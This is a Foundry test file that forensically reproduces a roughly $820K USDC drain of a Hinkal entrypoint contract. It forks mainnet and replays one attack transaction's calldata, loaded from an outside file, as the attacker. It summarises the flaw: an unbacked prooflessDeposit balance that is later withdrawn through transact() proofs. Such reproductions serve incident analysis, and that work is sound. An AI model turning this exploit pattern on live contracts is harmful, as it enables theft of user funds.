// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~$820K USDC
// Attacker : 0xbb3f01a1b1c68f3deb36c55342b5f5706c32fc20
// Vulnerable Contract : 0x25e5e82f5702A27C3466fE68f14abDbbAdFca826
// Initial Proofless Deposit Tx : 0xbf7252af56be8867a12e27cc332f85e8f39e906756e559d6a076dc8bd9d50008
// Replayed Drain Tx : 0x93a63d649878bb7e57741117362b7bc99b602f90335ea5fbff0365c4f2486228
//
// @Analysis
// The entrypoint accepted prooflessDeposit(), creating an unbacked private balance. The attacker then
// submitted a long sequence of transact() proofs that withdrew real USDC. This forensic reproduction
// forks immediately before one public drain transaction and replays its exact calldata. Earlier attack
// transactions are therefore already reflected in the fork state.

interface IERC20Hinkal {
    function balanceOf(
        address account
    ) external view returns (uint256);
}

contract HinkalExp is Test {
    address internal constant ATTACKER = 0xbB3f01a1b1C68F3DEB36C55342b5F5706c32fc20;
    address internal constant ENTRYPOINT = 0x25e5e82f5702A27C3466fE68f14abDbbAdFca826;
    IERC20Hinkal internal constant USDC = IERC20Hinkal(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    string internal constant CALLDATA = "src/test/2026-07/hinkal_calldata.txt";

    function setUp() public {
        vm.createSelectFork("mainnet", 25_448_349);
        vm.label(ATTACKER, "Hinkal attacker");
        vm.label(ENTRYPOINT, "Hinkal entrypoint");
    }

    function testExploit() public {
        uint256 attackerBefore = USDC.balanceOf(ATTACKER);
        uint256 poolBefore = USDC.balanceOf(ENTRYPOINT);
        bytes memory data = vm.parseBytes(vm.readLine(CALLDATA));
        vm.closeFile(CALLDATA);

        // Match the public transaction's block context.
        vm.roll(25_448_350);
        vm.warp(1_783_037_771);
        vm.prank(ATTACKER);
        (bool ok, bytes memory ret) = ENTRYPOINT.call(data);
        require(ok, string(ret));

        uint256 attackerGain = USDC.balanceOf(ATTACKER) - attackerBefore;
        uint256 poolLoss = poolBefore - USDC.balanceOf(ENTRYPOINT);
        emit log_named_decimal_uint("Attacker USDC gain", attackerGain, 6);
        emit log_named_decimal_uint("Hinkal USDC loss", poolLoss, 6);
        assertGt(attackerGain, 0, "representative drain did not pay attacker");
        assertEq(poolLoss, attackerGain, "pool loss should equal attacker gain");
    }
}
